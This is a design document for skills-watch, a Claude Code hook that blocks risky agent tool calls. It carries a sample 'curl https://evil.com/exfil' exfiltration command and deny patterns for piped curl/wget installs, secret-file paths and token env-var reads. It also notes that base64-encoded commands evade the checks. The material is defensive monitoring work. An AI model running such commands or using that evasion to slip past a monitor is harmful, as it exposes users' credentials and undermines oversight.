# ELI12

**skills-watch** is a one-time-install safety belt for Claude Code. You run `npx skills-watch install` once. After that, *every* skill you invoke in Claude Code — whether you type `/tango-research`, `/my-skill`, or just let Claude use tools on its own — gets guarded automatically. Behind the scenes, a small hook fires before every tool call the agent makes, checks it against a universal deny-list (no reading your SSH keys, AWS creds, git identity, shell history, or API-key-sniffing commands; no mid-run package installs; no network to anything outside a tight allow-list of model APIs and core dev infra), and blocks the bad stuff on the spot. When it blocks something, the agent sees the block and tells you in plain language — including the exact one-line command to *permanently allow that thing* if it was legitimate (`npx skills-watch allow add ~/.gitconfig`). Everything you allow is remembered in a single config file you can edit or list with the CLI. If you want a live feed of what your skills are doing, `tail -f ~/.skills-watch/live.log` in a second terminal. `npx skills-watch summary` prints counts from the latest session. Zero config to install, one-command overrides, nothing to remember to type per skill.

The v0 goal: one real outside developer has `skills-watch install`'d and is running skills under the hook within 14 days of rubric approval.

# Product

## Target user
A solo developer or small dev-tools team who uses **Claude Code** (with occasional Cursor / Codex / Cline / Gemini CLI on the side) and installs community skills via `npx skills add <owner>/<repo>`. They are a *builder*, not a security engineer. They have hit the "wait, what does this thing actually do on my laptop?" moment at least once and stalled their skill adoption because of it. v0 is Claude-Code-first; cross-agent support is an explicit v1+ path. [Cites: `C1.1 (mkt: skills.sh community)`, `C1.2 (mkt: builder not security-engineer)`, `C2.2 (dep: Claude Code agent tool loop)`, `spikes/icp.md`.]

## The one-command install — everything after is automatic
Entire v0 UX:

```
npx skills-watch install
```

What that does: writes a `PreToolUse` hook into `~/.claude/settings.json` pointing at `skills-watch-hook`. Idempotent (re-running is a no-op). If the user already has hooks, it merges instead of clobbering. No login, no account creation, no config file, no API key — *zero prompts between install and value* [`FRICTION`, `UX-INSTALL`].

After that, nothing to prepend, nothing to remember. Every time the user invokes a skill in Claude Code:

```
> /tango-research design a passive pressure regulator
```

…the hook fires on every tool call the agent makes underneath (`Bash`, `Read`, `Write`, `Edit`, `WebFetch`, `WebSearch`). Each call is checked against the universal deny-list. Each is logged to `~/.skills-watch/live.log`. Users who want to see what's happening in real time run `tail -f ~/.skills-watch/live.log` in a second terminal [`PAINKILLER — live log`]:

```
2026-04-18T17:41:22.031Z  ALLOW  Bash      cd /tmp/scratch && python3 -c "print('hi')"
2026-04-18T17:41:22.448Z  ALLOW  Read      ./rubric.md
2026-04-18T17:41:22.612Z  ALLOW  WebFetch  generativelanguage.googleapis.com
2026-04-18T17:41:23.017Z  BLOCK  Read      /Users/shiva/.ssh/id_rsa
```

Users who don't care to watch live just let it run; blocks still surface inline in the Claude Code conversation.

## What skills-watch blocks by default
Without any configuration, the universal deny-list blocks the actions that almost no legitimate skill needs:

- **Secrets on disk** (any `Read`/`Write`/`Edit` targeting these paths): `~/.ssh/`, `~/.aws/`, `~/.gnupg/`, `~/.netrc`, `~/.docker/config.json`, `~/.agents/.env`, any stray `.env` outside the current working directory.
- **Shell history** (the most overlooked PII/secret channel): `~/.zsh_history`, `~/.bash_history`.
- **Global git identity & credentials:** `~/.gitconfig`, `~/.git-credentials`, `~/.config/git/credentials`. Local `<cwd>/.git/` is **allowed** so a skill committing into its working repo still works [`GIT POLICY`].
- **Outbound network** (any `WebFetch` / `WebSearch` / host-carrying `Bash` command): deny-by-default except `*.anthropic.com`, `api.openai.com`, `generativelanguage.googleapis.com`, `github.com`, `pypi.org`, `registry.npmjs.org` [`NET DENY`].
- **Mid-run package installs** (any `Bash` command matching): `pip install`, `pip3 install`, `npm install`, `yarn add`, `pnpm add`, `curl ... | sh`, `wget ... | sh` [`BASH DENY`].

When the hook fires a block, it exits 2 with a formatted stderr message:

```
BLOCKED: READ /Users/shiva/.ssh/id_rsa — to allow, run: npx skills-watch allow add /Users/shiva/.ssh/id_rsa
```

Claude Code feeds this stderr to Claude as an error. Claude then relays it to the user in natural language, including the override hint [`CLARITY — actionable BLOCKED`, `PAINKILLER — block-on-use`].

## Escape hatch — a persistent allow-list, managed by CLI
When a skill legitimately needs something on the deny-list, the user runs a one-line command:

```
npx skills-watch allow add ~/.gitconfig
npx skills-watch allow add-host api.mysite.com
npx skills-watch allow list
npx skills-watch allow remove ~/.gitconfig
```

The allow-list is stored at `~/.skills-watch/config.json` and read by the hook on every invocation. No env-var-propagation-magic (which was investigated and rejected in Round 4 as too fragile — the hook's subprocess boundary through Claude Code is not a reliable env-var carrier). The trade-off: allow-list persists across sessions (a mild downside: users who grant `~/.gitconfig` once need to remember to remove it later if they want strict default again), but the reliability is worth it. Scope is always user-wide — no per-skill or per-session granularity in v0 [`ESCAPE HATCH`].

When the hook blocks a tool call, the BLOCKED stderr message names the exact `npx skills-watch allow add ...` command the user can run to unblock — one copy-paste from a "no" to a "yes".

## Out of scope for v0
- **Cursor, Codex, Cline, Gemini CLI.** Those agents have their own hook / tool-call systems; Claude Code is the Wedge-1 target. Cross-agent adaptation is a v1 path per `spikes/niche_expansion.md`.
- **Kernel-level enforcement.** The hook is pattern-matching at the tool-call boundary, not a sandbox. A skill that base64-encodes a malicious command could still slip through the Bash-pattern check. v1 plans to add SRT subprocess wrapping as a second layer for kernel-enforced isolation [`C2.1`].
- **Per-skill persisted allow-lists.** Env-var escape hatch is per-session only in v0. Persistent trust levels are v1 territory [`C1.2`].

# Technical

## Architecture at a glance
Two shell-script-grade components, distributed as one npm package (`skills-watch`).

- `bin/skills-watch` — the management CLI. Subcommands: `install`, `uninstall`, `status`, `summary [--since <duration>]`, `allow {add|add-host|remove|remove-host|list}`.
- `bin/skills-watch-hook` — the hook binary Claude Code invokes before every tool call. Reads the tool-call JSON on stdin, applies the universal deny-list plus the user's `~/.skills-watch/config.json` allow-list, writes to `~/.skills-watch/live.log`, exits 0 or 2.

Total ~150–200 LOC across both components. Node.js so the `npx` install flow works for every user who already has Claude Code installed (Claude Code requires Node). No daemon, no state beyond `~/.skills-watch/live.log` and `~/.claude/settings.json` [`DISTRIBUTION`, `C3.2`].

## The management CLI (`bin/skills-watch`)
Subcommands:

- `install` — reads `~/.claude/settings.json` (creating if absent), merges in a `hooks.PreToolUse` entry pointing at `skills-watch-hook`, preserves any pre-existing hook entries, writes atomically. Also creates `~/.skills-watch/config.json` with an empty allow-list if absent. Idempotent: second run outputs `already installed` [`HOOK-INSTALL`, `UX-INSTALL`].
- `uninstall` — removes only the `skills-watch-hook` entry; leaves other hooks intact. Does not delete `~/.skills-watch/config.json` (user's allow-list is preserved in case they reinstall).
- `status` — prints whether the hook is installed, the live-log path, and the effective allow-list.
- `summary [--since <duration>]` — reads `~/.skills-watch/live.log`, prints `SUMMARY: N tool calls, K BLOCKED (since <iso8601>)`. Default window is "since last SessionStart event"; `--since 1h` (or 30m, 2d) windows by duration [`CLARITY — summary CLI`].
- `allow {add|add-host|remove|remove-host|list}` — reads / mutates `~/.skills-watch/config.json`. Validates path existence and host format. All idempotent. Examples:
  - `npx skills-watch allow add ~/.gitconfig`
  - `npx skills-watch allow add-host api.mysite.com`
  - `npx skills-watch allow list`

~120 LOC. Uses Node's built-in `fs` + `path`; no external deps.

## The hook (`bin/skills-watch-hook`)

### Input
Claude Code invokes the hook with a JSON payload on stdin like:
```json
{"tool": "Read", "arguments": {"file_path": "/Users/shiva/.ssh/id_rsa"}}
```
or
```json
{"tool": "Bash", "arguments": {"command": "curl https://evil.com/exfil"}}
```

### Pipeline
1. Parse stdin JSON.
2. Load allow-overrides from `~/.skills-watch/config.json` (or use empty lists if file absent).
3. Apply deny-list pattern checks in this order:
   - **Filesystem path match** (`Read`/`Write`/`Edit`/`MultiEdit` tools): expand `~`, canonicalize path, check against deny-list regex unless overridden.
   - **Network host match** (`WebFetch`/`WebSearch` tools): extract host, check against allow-list unless overridden.
   - **Bash command pattern match** (`Bash` tool): apply three regex groups — (a) mid-run installer patterns (`pip install`, `curl | sh`, etc.), (b) egress patterns with host extraction (`curl <host>`, `wget <host>`, `git push <host>`, etc.), (c) secret-path patterns in `cat`/`less`/`head`/etc. invocations.
4. If any check denies: append `<iso8601> BLOCK <TOOL> <OBJECT>` to `~/.skills-watch/live.log`, print the formatted BLOCKED message to stderr (including the exact `npx skills-watch allow add ...` override command), exit 2.
5. If all checks pass: append `<iso8601> ALLOW <TOOL> <OBJECT>` to live log, exit 0.

~120 LOC. No dependencies beyond Node built-ins [`HOOK-DECISION`, `FILE DENY`, `NET DENY`, `BASH DENY`, `LIVE LOG`].

### Bash env-var-read detection
For `Bash` tool calls, the hook also pattern-matches common env-var-read attempts — `printenv <VAR>`, `echo $<VAR>`, `env | grep <VAR>` — where `<VAR>` matches `AWS_*`, `ANTHROPIC_*`, `OPENAI_*`, `GEMINI_*`, `GOOGLE_*`, `GITHUB_TOKEN`, `NPM_TOKEN`, `SSH_*`. On match, exit 2. **Honest limit:** the hook cannot actually scrub the environment (that requires SRT subprocess wrapping, deferred to v1). A base64-encoded variant of the read still slips through. v0 catches the common attack pattern, not the sophisticated one [`PAINKILLER — env-var read detection`].

## Universal policy data (hardcoded, not configurable in v0)

**Filesystem deny-list (read + write + edit):**
```
~/.ssh/           ~/.aws/           ~/.gnupg/
~/.netrc          ~/.docker/config.json
~/.agents/.env    ~/.zsh_history    ~/.bash_history
~/.gitconfig      ~/.git-credentials    ~/.config/git/credentials
```
…plus any file matching `.env` anywhere *outside* the skill's CWD. `<cwd>/.git/` is explicitly NOT on the list [`GIT POLICY`].

**Network allow-list (all other hosts denied):**
```
*.anthropic.com    api.openai.com    generativelanguage.googleapis.com
github.com         pypi.org          registry.npmjs.org
```

**Bash mid-run installer patterns (denied):**
```
/\bpip3?\s+install\b/     /\bnpm\s+install\b/     /\byarn\s+add\b/
/\bpnpm\s+add\b/          /\bcurl\b.*\|\s*sh\b/   /\bwget\b.*\|\s*sh\b/
```

## Flow: what happens when the user invokes a skill

1. User types `/tango-research <goal>` in Claude Code.
2. Claude reads `tango-research/SKILL.md`, decides to call `Bash` to run a Python script.
3. Claude Code, before executing the tool call, invokes `skills-watch-hook` with the tool payload on stdin.
4. Hook checks the `Bash` command against the deny-list patterns.
5. If clean: exit 0 (allow), append `ALLOW Bash python3 ...` to live log; tool runs.
6. If `curl example.com` is in the command: exit 2 with stderr `BLOCKED: Bash-egress example.com — to allow, run: npx skills-watch allow add-host example.com`.
7. Claude sees the exit-2 error, stops, tells the user what was blocked + how to rerun.

## Verification spikes (required before Phase 2 converge)
- `spikes/redteam_secrets.py` — for each of the 7 red-team actions, synthesize a tool-call JSON payload, invoke `skills-watch-hook` with that payload on stdin, assert exit code 2 + expected stderr message (including the `npx skills-watch allow add ...` override hint).
- `spikes/perf_hook.py` — time 1000 benign tool calls through the hook, assert mean overhead ≤ 20 ms and p99 ≤ 50 ms.
- `spikes/install_walkthrough.sh` — clean-laptop end-to-end test: run `npx skills-watch install`, invoke a known benign skill in Claude Code, assert log lines appear and exit code is 0. Re-run install, assert idempotent no-op.
- `spikes/escape_hatch.sh` — run `npx skills-watch allow add ~/.gitconfig`; invoke a skill that reads `~/.gitconfig`; assert allow; `allow remove`; assert re-blocked.
- `spikes/summary_cli.sh` — run a scripted sequence of benign + blocked tool calls; run `npx skills-watch summary --since 10m`; assert the printed counts match the scripted counts.

## Known limits (honest)
- **Pattern-matching is defeatable.** A skill that base64-encodes a malicious Bash command (`bash -c "$(echo ... | base64 -d)"`) can slip past the regex check. v0 accepts this trade for the coverage gain; v1 adds SRT subprocess wrapping as a deeper enforcement layer.
- **Only Claude Code in v0.** Cursor, Codex, Cline, Gemini CLI all have their own tool-call boundaries that would each need a dedicated integration. v1 path per `spikes/niche_expansion.md`.
- **No mid-tool observability.** Claude Code hooks fire pre- and post-tool, not during. A long-running `Bash` call is visible at entry and exit but not during execution. Out of scope for v0.
- **No Windows.** Claude Code's macOS + Linux support is what we inherit. Windows is a v1+ conversation.

## Out of scope for v0 (consistent with Product section)
- Cross-agent adaptation (Cursor, Codex, Cline, Gemini CLI hook integrations).
- SRT subprocess wrapping as a second enforcement layer.
- Per-skill persisted allow-lists.
- Team policy server, shared deny-list profiles, CI integration.

# ELI12 Changelog

| Version | After Round | What's new since previous | Why it changed |
|---|---|---|---|
| v0 | bootstrap | Initial ELI12 written. | Session start. |
| v1 | R1 (Product ACCEPT) | ELI12 now says *what you type*, *how fast it starts*, *exactly what the deny-list covers*, *what the BLOCKED message looks like*, and *that local `.git/` still works*. | Product section became concrete and rubric-traced. |
| v2 | R2 (Technical ACCEPT) | ELI12 unchanged at user-facing level. | Technical internals don't belong in ELI12. |
| v3 | R3 pivot (C2.2 flip) | ELI12 rewrites around *install-once, then every skill is guarded* rather than *prepend `npx skills-watch` every time*. User now runs a single install command; afterwards `/tango-research` and friends work guarded without any per-invocation ceremony. Live log is now an opt-in `tail -f` in a second terminal, not an inline stream. | Constraint-audit pivot: the CLI wrapper missed the agent tool loop, which is where the real pain lives. Hook model removes all per-invocation friction. |
| v4 | R4 (three R4-REJECT fixes) | ELI12 clarifies the override story: it's a one-line `npx skills-watch allow add <path>` command that the BLOCKED message tells you verbatim, persisted in a config file you can edit or list. Adds `npx skills-watch summary`. Env-var "scrub" language softened to "detect read attempts" (an honest v0 limit). | R4 rejected three false promises: SessionEnd hook doesn't exist (replaced with summary CLI), env-var scrub is impossible in hook model (replaced with pattern detection), env-var-based override was an unverified assumption (replaced with config-file persistence). All three fixes preserve the "easy and automatic" UX promise while being implementable. |
